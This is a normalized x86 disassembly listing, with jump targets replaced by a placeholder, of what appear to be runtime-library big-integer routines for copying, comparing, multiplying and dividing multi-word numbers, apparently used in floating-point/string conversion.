cmp [ ebp - 0x3a4 ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
and [ ebp - 0x950 ] 0x0
and [ ebp - 0x3a4 ] 0x0
push 0x0
mov eax [ ebp - 0x764 ]
sub eax [ ebp - 0x75c ]
mov [ ebp - 0x764 ] eax
jne r-xdata
mov eax [ ebp - 0x3a4 ]
xor ecx ecx
mov [ ebp - 0x760 ] eax
xor edi edi
cmp esi ebx
jae r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
and eax [ ebp - 0x760 ]
sub edx 0x4
mov ecx [ ebp - 0x750 ]
mov ebx [ ebp - 0x754 ]
and ebx [ ebp - 0x774 ]
shr eax cl
mov ecx [ ebp - 0x764 ]
shl ebx cl
mov ecx [ ebp - 0x75c ]
or eax ebx
mov [ ebp + ecx * 4 - 0x1d0 ] eax
dec ecx
dec edi
mov [ ebp - 0x75c ] ecx
cmp ecx 0xffffffff
je r-xdata
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
xor edi edi
mov edi [ eax ]
jmp r-xdata
add eax [ ebp - 0x778 ]
mov [ ebp - 0x750 ] eax
cmp esi eax
je r-xdata
mov eax ecx
add ecx eax
mov eax [ ebp - 0x3a4 ]
cmp eax 0x73
jae r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
xor edx edx
xor esi esi
mov [ ebp - 0x744 ] edx
test ecx ecx
je r-xdata
mov eax [ ebp - 0x1d4 ]
mov [ ebp - 0x758 ] eax
mov eax [ ebp - 0x1d4 ]
xor ecx ecx
mov [ ebp - 0x76c ] eax
xor esi esi
lea eax [ ebp - 0x94c ]
push eax
lea eax [ ebp - 0x1d0 ]
mov ecx [ ebp - 0x760 ]
mov eax esi
mul [ ebp + edi * 4 - 0x1d0 ]
add eax ecx
mov [ ebp + edi * 4 - 0x1d0 ] eax
adc edx 0x0
inc edi
mov ecx edx
cmp edi [ ebp - 0x76c ]
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp - 0x3a4 ]
cmp eax 0x73
jae r-xdata
xor edx edx
xor esi esi
mov [ ebp - 0x744 ] edx
test ecx ecx
je r-xdata
mov eax [ ebp - 0x3a4 ]
mov [ ebp - 0x74c ] eax
mov eax [ ebp - 0x3a4 ]
xor ecx ecx
mov [ ebp - 0x760 ] eax
xor esi esi
mov ecx [ ebp - 0x76c ]
mov eax esi
mul [ ebp + edi * 4 - 0x3a0 ]
add eax ecx
mov [ ebp + edi * 4 - 0x3a0 ] eax
adc edx 0x0
inc edi
mov ecx edx
cmp edi [ ebp - 0x760 ]
jne r-xdata
jmp r-xdata
cmp ecx esi
jb r-xdata
and [ ebp - 0x56c ] 0x0
xor ecx ecx
push 0x4
pop eax
inc ecx
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x574 ] ecx
mov [ ebp - 0x3a4 ] ecx
push eax
xor eax eax
mov eax [ ebp - 0x74c ]
mov eax [ eax - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ esi ] 0x0
xor ecx ebp
pop esi
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1d4 ]
test eax eax
je r-xdata
xor eax eax
push eax
mov [ ebp - 0x950 ] eax
mov [ ebp - 0x3a4 ] eax
lea eax [ ebp - 0x94c ]
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
jmp r-xdata
mov [ ebp + eax * 4 - 0x3a0 ] ecx
inc [ ebp - 0x3a4 ]
jmp r-xdata
mov [ ebp + eax * 4 - 0x1d0 ] esi
inc [ ebp - 0x1d4 ]
jmp r-xdata
mov eax edx
mov [ ebp - 0x1d4 ] edx
shl eax 0x2
push eax
lea eax [ ebp - 0x740 ]
lea eax [ ebp - 0x740 ]
sub edi eax
mov [ ebp - 0x780 ] edi
mov eax edi
mul [ ebp + esi * 4 - 0x1d0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x1d0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x76c ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
mov [ ebp + eax * 4 - 0x3a0 ] ecx
inc [ ebp - 0x3a4 ]
jmp r-xdata
mov eax edx
mov [ ebp - 0x3a4 ] edx
shl eax 0x2
lea eax [ ebp - 0x740 ]
sub edi eax
mov [ ebp - 0x780 ] edi
mov eax edi
mul [ ebp + esi * 4 - 0x3a0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x3a0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x760 ]
jne r-xdata
test ecx ecx
je r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
and eax [ ebp - 0x774 ]
and edi [ ebp - 0x760 ]
mov ecx [ ebp - 0x75c ]
shr eax cl
mov ecx [ ebp - 0x764 ]
shl edi cl
mov ecx [ ebp - 0x754 ]
or eax edi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
dec ecx
mov eax [ ebp - 0x74c ]
dec esi
sub eax 0x4
mov [ ebp - 0x754 ] ecx
mov [ ebp - 0x74c ] eax
cmp ecx 0xffffffff
je r-xdata
xor ecx ecx
mov esi eax
xor edi edi
xor eax eax
xor edi edi
mov ecx esi
mov [ ebp - 0x75c ] eax
cmp [ ebp - 0x758 ] eax
je r-xdata
cmp esi edx
jne r-xdata
xor eax eax
push eax
mov [ ebp - 0x950 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x94c ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
xor al al
jmp r-xdata
mov [ ebp + eax * 4 - 0x1d0 ] ecx
inc [ ebp - 0x1d4 ]
jmp r-xdata
xor eax eax
xor edi edi
mov ecx esi
mov [ ebp - 0x758 ] eax
cmp [ ebp - 0x74c ] eax
je r-xdata
cmp esi edx
jne r-xdata
mov eax [ ebp - 0x3a4 ]
cmp eax 0x73
jb r-xdata
cmp ecx edx
jb r-xdata
mov eax [ ebp + edi * 4 - 0x1d0 ]
mov edx 0x3b9aca00
mul edx
add eax ecx
mov [ ebp + edi * 4 - 0x1d0 ] eax
adc edx 0x0
inc edi
mov ecx edx
cmp edi esi
jne r-xdata
mov esi [ ebp - 0x74c ]
test ecx ecx
je r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc esi
cmp esi ecx
jne r-xdata
and [ ebp + esi * 4 - 0x740 ] eax
lea edx [ esi + 0x1 ]
mov [ ebp - 0x744 ] edx
jmp r-xdata
test al al
je r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc esi
cmp esi ecx
jne r-xdata
and [ ebp + esi * 4 - 0x740 ] eax
lea edx [ esi + 0x1 ]
mov [ ebp - 0x744 ] edx
jmp r-xdata
mov [ ebp + eax * 4 - 0x3a0 ] ecx
inc [ ebp - 0x3a4 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
lea eax [ ebp - 0x570 ]
jmp r-xdata
lea eax [ ebp - 0x3a4 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_4409b0
pop ecx
pop ecx
mov ecx [ ebp - 0x750 ]
push 0x8
pop edi
sub ecx esi
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
mov edi [ ebp - 0x780 ]
mov ecx [ ebp - 0x754 ]
test edi edi
je r-xdata
cmp ecx edx
jne r-xdata
lea eax [ edi + esi * 4 ]
mov eax [ ebp + eax - 0x740 ]
mov [ ebp - 0x76c ] eax
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x950 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
lea eax [ ebp - 0x94c ]
mov edi [ ebp - 0x780 ]
mov ecx [ ebp - 0x754 ]
test edi edi
je r-xdata
cmp ecx edx
jne r-xdata
lea eax [ edi + esi * 4 ]
mov eax [ ebp + eax - 0x740 ]
mov [ ebp - 0x760 ] eax
test eax eax
jne r-xdata
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
xor al al
jmp r-xdata
dec edi
cmp edi 0xffffffff
jne r-xdata
mov [ edi + esi ] dl
xor eax eax
push eax
mov [ ebp - 0x950 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x94c ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
mov [ ebp + eax * 4 - 0x1d0 ] ecx
inc [ ebp - 0x1d4 ]
jmp r-xdata
cmp ecx 0x73
je r-xdata
mov edx [ ebp - 0x750 ]
mov eax [ edx + eax * 4 ]
mul [ ebp - 0x76c ]
add eax edi
adc edx 0x0
add [ ebp + ecx * 4 - 0x740 ] eax
mov eax [ ebp - 0x75c ]
adc edx 0x0
inc eax
inc ecx
mov [ ebp - 0x75c ] eax
mov edi edx
mov edx [ ebp - 0x744 ]
cmp eax [ ebp - 0x758 ]
jne r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
inc eax
add eax esi
mov [ ebp - 0x744 ] eax
mov eax [ ebp - 0x75c ]
test al al
je r-xdata
cmp ecx 0x73
je r-xdata
mov edx [ ebp - 0x750 ]
mov eax [ edx + eax * 4 ]
mul [ ebp - 0x760 ]
add eax edi
adc edx 0x0
add [ ebp + ecx * 4 - 0x740 ] eax
mov eax [ ebp - 0x758 ]
adc edx 0x0
inc eax
inc ecx
mov [ ebp - 0x758 ] eax
mov edi edx
mov edx [ ebp - 0x744 ]
cmp eax [ ebp - 0x74c ]
jne r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
inc eax
add eax esi
mov [ ebp - 0x744 ] eax
mov eax [ ebp - 0x758 ]
xor edx edx
div [ ebp - 0x774 ]
add dl 0x30
cmp ecx edi
jb r-xdata
cmp ecx 0x9
jbe r-xdata
cmp ecx edx
jne r-xdata
cmp ecx edx
jne r-xdata
add esi ecx
mov [ ebp - 0x74c ] esi
cmp esi [ ebp - 0x750 ]
jne r-xdata
push 0x9
pop ecx
mov eax edi
xor edi edi
add [ ebp + ecx * 4 - 0x740 ] eax
mov edx [ ebp - 0x744 ]
adc edi edi
inc ecx
jmp r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x744 ] eax
mov eax edi
xor edi edi
add [ ebp + ecx * 4 - 0x740 ] eax
mov edx [ ebp - 0x744 ]
adc edi edi
inc ecx
jmp r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x744 ] eax
sub_4407d0
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ edx ]
mov [ esi ] eax
mov eax [ edx ]
shl eax 0x2
push eax
lea eax [ edx + 0x4 ]
push eax
lea eax [ esi + 0x4 ]
push 0x1cc
push eax
call sub_442e6b
add esp 0x10
mov eax esi
pop esi
pop ebp
retn 0x4
sub_440819
mov edi edi
push esi
mov esi ecx
push esi
call sub_44605d
mov eax [ esi ]
and eax 0x1f
pop ecx
cmp al 0x1f
jne r-xdata
push esi
call sub_4460c3
pop ecx
mov [ esi + 0x8 ] 0x1
mov [ esi + 0x8 ] 0x0
jmp r-xdata
mov eax esi
pop esi
retn
sub_440860
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ edx ]
mov [ esi ] eax
mov eax [ edx ]
shl eax 0x2
push eax
lea eax [ edx + 0x4 ]
push eax
lea eax [ esi + 0x4 ]
push 0x1cc
push eax
call sub_442e6b
add esp 0x10
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4408a0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi ]
cmp esi [ ecx ]
je r-xdata
xor edx edx
test esi esi
je r-xdata
pop edi
xor al al
pop esi
pop ebp
retn
pop edi
mov al 0x1
pop esi
pop ebp
retn
lea eax [ ecx + 0x4 ]
sub edi ecx
inc edx
add eax 0x4
cmp edx esi
jne r-xdata
mov ecx [ edi + eax ]
cmp ecx [ eax ]
jne r-xdata
sub_4408e0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ ecx ]
cmp esi [ edi ]
je r-xdata
xor edx edx
test esi esi
je r-xdata
xor cl cl
xor eax eax
test cl cl
pop edi
sete al
pop esi
pop ebp
retn
mov cl 0x1
xor eax eax
test cl cl
pop edi
sete al
pop esi
pop ebp
retn
lea eax [ ecx + 0x4 ]
sub edi ecx
jmp r-xdata
mov ecx [ eax ]
cmp ecx [ edi + eax ]
jne r-xdata
inc edx
add eax 0x4
cmp edx esi
jne r-xdata
sub_440930
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor eax eax
mov ecx [ edx ]
add ecx [ ebp + 0xc ]
adc eax eax
add ecx [ ebp + 0x10 ]
mov [ edx ] ecx
adc eax 0x0
pop ebp
retn
sub_440950
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mul [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
adc edx 0x0
add eax [ ebp + 0x14 ]
mov [ ecx ] eax
adc edx 0x0
mov eax edx
pop ebp
retn
sub_440970
mov edi edi
push ebp
mov ebp esp
push ecx
bsr eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
inc eax
mov esp ebp
pop ebp
retn
sub_4409b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x21c
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
test eax eax
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
mov ecx [ edi ]
test ecx ecx
jne r-xdata
xor edx edx
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ eax - 0x1 ]
lea eax [ ecx - 0x1 ]
mov [ ebp - 0xc ] esi
test eax eax
jne r-xdata
pop edi
xor eax eax
xor edx edx
pop ebx
mov esp ebp
pop ebp
retn
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x28 ] ecx
cmp ecx 0x1
jne r-xdata
pop esi
pop edi
xor eax eax
xor edx edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
lea ecx [ eax + 0x1 ]
sub edx eax
mov [ ebp - 0x38 ] ecx
mov ecx esi
cmp esi edx
jl r-xdata
test esi esi
jne r-xdata
mov esi [ ebx + 0x4 ]
lea ecx [ ebx + 0x4 ]
push eax
mov [ ebp - 0x21c ] eax
mov [ ebx ] eax
lea eax [ ebp - 0x218 ]
push eax
push 0x1cc
push ecx
call sub_442e6b
add esp 0x10
mov eax esi
xor edx edx
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov eax ecx
inc esi
sub eax edx
lea esi [ ebx + esi * 4 ]
lea edi [ edi + eax * 4 ]
add edi 0x4
xor edi edi
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] edi
cmp esi 0xffffffff
je r-xdata
mov esi [ ebx + 0x4 ]
lea eax [ ebp - 0x218 ]
push 0x0
push eax
lea edi [ ebx + 0x4 ]
mov [ ebp - 0x21c ] 0x0
push 0x1cc
push edi
mov [ ebx ] 0x0
call sub_442e6b
xor edx edx
mov eax esi
div [ ebp - 0x28 ]
add esp 0x10
xor ecx ecx
cmp ecx edx
mov [ edi ] edx
sbb ecx ecx
pop esi
neg ecx
xor edx edx
pop edi
mov [ ebx ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x38 ]
mov eax [ ebp + 0xc ]
mov esi [ eax + edi * 4 ]
mov eax [ eax + edi * 4 - 0x4 ]
mov [ ebp - 0x20 ] eax
bsr eax esi
mov [ ebp - 0x34 ] esi
je r-xdata
mov esi [ ebp + 0xc ]
mov eax ecx
sub eax edx
mov eax [ esi + eax * 4 + 0x4 ]
cmp eax [ ebx + ecx * 4 + 0x4 ]
jae r-xdata
dec ecx
sub edi 0x4
sub esi 0x4
cmp ecx edx
jge r-xdata
push 0x0
lea eax [ ebp - 0x218 ]
mov [ ebp - 0x21c ] 0x0
push eax
lea esi [ ebx + 0x4 ]
mov [ ebx ] 0x0
push 0x1cc
push esi
call sub_442e6b
mov eax [ ebp - 0x10 ]
add esp 0x10
mov edx [ ebp - 0x4 ]
xor ecx ecx
cmp ecx eax
mov [ esi ] edi
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x8 ]
sbb ecx ecx
neg ecx
pop esi
inc ecx
pop edi
mov [ ebx ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
inc esi
inc eax
mov [ ebp - 0x1c ] eax
lea esi [ ebx + esi * 4 ]
lea esp [ esp ]
mov ecx 0x20
mov ecx 0x1f
sub ecx eax
jmp r-xdata
test edx edx
jne r-xdata
mov eax [ edi ]
cmp eax [ esi ]
jne r-xdata
jmp r-xdata
push 0x0
push ecx
xor eax eax
or eax [ esi ]
push edi
push eax
call sub_448b80
mov [ ebp - 0x40 ] edx
lea esi [ esi - 0x4 ]
xor edx edx
mov [ ebp - 0x10 ] ebx
mov edi ecx
add edx eax
mov ecx [ ebp - 0x8 ]
adc ecx 0x0
mov [ ebp - 0x8 ] edx
sub [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x28 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x48 ] 0x0
add edx 0xffffffff
mov [ ebp - 0x1c ] edx
js r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x3c ]
shr eax cl
mov ecx [ ebp - 0x24 ]
shl [ ebp - 0x20 ] cl
shl esi cl
or esi eax
mov [ ebp - 0x34 ] esi
cmp edi 0x2
jbe r-xdata
mov eax 0x20
mov [ ebp - 0x24 ] ecx
sub eax ecx
mov [ ebp - 0x3c ] eax
test ecx ecx
je r-xdata
xor edi edi
lea ecx [ ebx + 0x4 ]
lea ecx [ ecx + edx * 4 ]
mov [ ebp - 0x10 ] ecx
lea eax [ edx + edi ]
lea ecx [ ebx - 0x4 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ecx + eax * 4 ]
mov [ ebp - 0x4c ] ecx
mov esi [ ebp + 0xc ]
mov ecx [ ebp - 0x3c ]
mov eax [ esi + edi * 4 - 0x8 ]
shr eax cl
or [ ebp - 0x20 ] eax
mov [ ebx ] edx
test edx edx
je r-xdata
lea ecx [ eax + 0x1 ]
lea ecx [ ebx + ecx * 4 ]
jmp r-xdata
xor eax eax
mov eax [ ecx + 0x8 ]
jmp r-xdata
mov edx esi
mov eax edi
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx ]
cmp [ ebx + ecx * 4 ] 0x0
jne r-xdata
mov [ ecx ] 0x0
lea ecx [ ecx + 0x4 ]
inc eax
cmp eax [ ebx ]
jb r-xdata
push 0x0
push [ ebp - 0x34 ]
push eax
push edx
call sub_448b80
mov [ ebp - 0x28 ] ebx
xor esi esi
mov ebx eax
mov [ ebp - 0x28 ] esi
mov eax edx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x18 ] eax
mov edi ecx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x40 ] eax
test eax eax
jne r-xdata
mov edi ecx
mov eax edx
mov ecx [ ebp - 0x3c ]
xor esi esi
mov edx [ ebp - 0x4 ]
shr edi cl
mov ecx [ ebp - 0x24 ]
call sub_448df0
mov ecx [ ebp - 0x24 ]
or esi edx
or edi eax
mov eax esi
mov esi [ ebp - 0x14 ]
mov edx edi
shl esi cl
cmp [ ebp - 0x8 ] 0x3
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] esi
jb r-xdata
cmp [ ebp - 0x24 ] 0x0
mov edx [ ecx + 0x4 ]
mov ecx [ ecx ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] ecx
jbe r-xdata
add ecx 0xffffffff
mov [ ebx ] ecx
jne r-xdata
push 0x0
push [ ebp - 0x34 ]
add ebx 0x1
adc eax 0xffffffff
push eax
push ebx
call sub_448d60
add edi eax
adc esi edx
or ebx 0xffffffff
xor eax eax
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x40 ] eax
cmp ebx 0xffffffff
jbe r-xdata
mov eax [ ebp - 0x38 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x3c ]
mov eax [ ebx + eax * 4 - 0x8 ]
shr eax cl
or esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] esi
test eax eax
jne r-xdata
jb r-xdata
test esi esi
ja r-xdata
mov ecx [ ebp - 0x38 ]
xor edi edi
xor esi esi
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
push eax
push ebx
xor ecx ecx
mov esi edi
or ecx [ ebp - 0x14 ]
push 0x0
push [ ebp - 0x20 ]
mov [ ebp - 0x4 ] ecx
call sub_448d60
cmp edx esi
jb r-xdata
cmp edi 0xffffffff
ja r-xdata
xor eax eax
cmp eax esi
ja r-xdata
mov eax [ ebp + 0xc ]
mov ebx [ ebp - 0x10 ]
add eax 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] ecx
mov esi [ ebp - 0x48 ]
xor eax eax
mov edx [ ebp - 0x1c ]
add eax ebx
mov ecx [ ebp - 0x4c ]
mov edi eax
mov eax [ ebp - 0x8 ]
adc esi 0x0
sub [ ebp - 0x10 ] 0x4
dec edx
mov ebx [ ebp + 0x8 ]
sub ecx 0x4
dec eax
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x8 ] eax
test edx edx
jns r-xdata
mov eax [ ebp - 0x18 ]
ja r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0xc ] eax
jb r-xdata
sub eax ecx
mov [ ebx ] eax
add ebx 0x4
mov eax [ ebp - 0x14 ]
add eax 0x4
sub [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] eax
jne r-xdata
add edi 0x1
adc esi esi
cmp eax [ ebp - 0xc ]
ja r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
add ebx 0xffffffff
mov [ ebp - 0x44 ] ebx
adc eax 0xffffffff
add edi [ ebp - 0x34 ]
mov [ ebp - 0x18 ] eax
adc [ ebp - 0x28 ] 0x0
mov [ ebp - 0x40 ] eax
jne r-xdata
cmp eax [ ebp - 0x4 ]
jbe r-xdata
test ecx ecx
je r-xdata
cmp [ ebp - 0x30 ] edi
jae r-xdata
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x40 ]
mul [ ebp - 0x28 ]
mov ecx eax
mov eax [ ebp - 0x44 ]
mul [ ebp - 0x28 ]
add edx ecx
add edi eax
mov eax [ ebx ]
mov ecx edi
adc esi edx
mov edi esi
xor esi esi
cmp eax ecx
jae r-xdata
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
inc edx
mov eax edx
cmp eax [ ebx ]
jae r-xdata
mov [ ebp - 0x4 ] ebx
cmp edi 0xffffffff
jbe r-xdata
add ebx 0xffffffff
adc [ ebp - 0x18 ] 0xffffffff
mov esi [ ebp + 0xc ]
mov edi ecx
mov edx [ ebp - 0x10 ]
add esi 0x4
mov ebx eax
lea esp [ esp ]
jmp r-xdata
mov ecx [ edx ]
lea esi [ esi + 0x4 ]
xor eax eax
lea edx [ edx + 0x4 ]
add ecx [ esi - 0x4 ]
adc eax eax
add ecx ebx
mov [ edx - 0x4 ] ecx
adc eax 0x0
mov ebx eax
sub edi 0x1
jne r-xdata
mov ebx [ ebp - 0x4 ]
sub_440e80
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x10 ]
test ecx ecx
mov [ eax + 0x8 ] ecx
setne dl
inc edx
mov [ eax ] edx
pop ebp
retn
sub_440ea0
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
shr eax 0x5
push esi
mov esi [ ebp + 0x8 ]
push edi
lea edi [ eax * 4 ]
mov [ ebp - 0x4 ] eax
push edi
lea eax [ esi + 0x4 ]
push 0x0
push eax
call sub_40dea0
and ebx 0x1f
add esp 0xc
mov ecx ebx
mov edx 0x1
shl edx cl
mov eax esi
mov ecx [ ebp - 0x4 ]
mov [ edi + esi + 0x4 ] edx
inc ecx
pop edi
mov [ esi ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440ef0
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov edx [ ecx ]
mov [ ebp - 0x1e0 ] ebx
push edi
cmp edx 0x1
ja r-xdata
mov esi [ ebx ]
mov [ ebp - 0x1e4 ] esi
cmp esi 0x1
ja r-xdata
mov edi [ ecx + 0x4 ]
test edi edi
jne r-xdata
cmp edx esi
setb al
test al al
lea eax [ ebx + 0x4 ]
mov [ ebp - 0x1e8 ] eax
je r-xdata
mov edi [ ebx + 0x4 ]
lea esi [ ebx + 0x4 ]
mov [ ebx ] edx
mov eax [ ecx ]
shl eax 0x2
push eax
lea eax [ ecx + 0x4 ]
mov [ ebp - 0x1d8 ] edi
push eax
push 0x1cc
push esi
call sub_442e6b
add esp 0x10
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
push edi
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] edi
push eax
push 0x1cc
lea eax [ ebx + 0x4 ]
mov [ ebx ] edi
push eax
jmp r-xdata
mov edi eax
mov [ ebp - 0x1e4 ] edx
lea eax [ ecx + 0x4 ]
mov [ ebp - 0x1dc ] eax
mov eax esi
mov [ ebp - 0x1dc ] eax
lea edi [ ecx + 0x4 ]
mov eax edx
jmp r-xdata
cmp edi 0x1
je r-xdata
push edi
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] edi
push eax
push 0x1cc
mov [ ebx ] edi
push esi
jmp r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
test eax eax
je r-xdata
call sub_442e6b
add esp 0x10
mov eax [ ebp - 0x1e0 ]
mov [ eax ] edx
lea eax [ edx * 4 ]
push eax
lea eax [ ebp - 0x1d0 ]
push eax
push 0x1cc
push [ ebp - 0x1e8 ]
lea eax [ ebp - 0x1d0 ]
sub edi eax
mov [ ebp - 0x1f0 ] edi
lea esp [ esp ]
xor edx edx
mov [ ebp - 0x1d8 ] eax
xor ebx ebx
mov [ ebp - 0x1d4 ] edx
test eax eax
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0x1dc ] eax
test eax eax
je r-xdata
lea edx [ ebx + 0x4 ]
xor esi esi
mov [ ebp - 0x1dc ] edx
xor ecx ecx
mov ebx eax
xor esi esi
xor edi edi
mov ecx ebx
cmp [ ebp - 0x1e4 ] esi
je r-xdata
cmp ebx edx
jne r-xdata
mov ebx [ ebp - 0x1d8 ]
xor edi edi
xor ecx ecx
mov eax edi
mul [ edx + ecx * 4 ]
add eax esi
adc edx 0x0
mov esi edx
mov edx [ ebp - 0x1dc ]
mov [ edx + ecx * 4 ] eax
inc ecx
cmp ecx ebx
jne r-xdata
mov ebx [ ebp - 0x1e0 ]
test esi esi
je r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc ebx
cmp ebx [ ebp - 0x1d8 ]
jne r-xdata
lea edx [ ebx + 0x1 ]
mov [ ebp + ebx * 4 - 0x1d0 ] eax
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
mov eax ebx
mul [ esi + ecx * 4 ]
add eax edi
mov [ esi + ecx * 4 ] eax
adc edx 0x0
inc ecx
mov edi edx
cmp ecx [ ebp - 0x1dc ]
jne r-xdata
mov ebx [ ebp - 0x1e0 ]
test edi edi
je r-xdata
mov eax [ ebx ]
cmp eax 0x73
jae r-xdata
mov eax [ ebp - 0x1e0 ]
push 0x0
mov [ ebp - 0x3c0 ] 0x0
mov [ eax ] 0x0
lea eax [ ebp - 0x3bc ]
push eax
push 0x1cc
push [ ebp - 0x1e8 ]
call sub_442e6b
mov ecx [ ebp - 0x4 ]
add esp 0x10
xor ecx ebp
xor al al
pop edi
pop esi
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x1f0 ]
test esi esi
je r-xdata
cmp ecx edx
jne r-xdata
lea eax [ edi + ebx * 4 ]
mov eax [ ebp + eax - 0x1d0 ]
mov [ ebp - 0x1ec ] eax
test eax eax
jne r-xdata
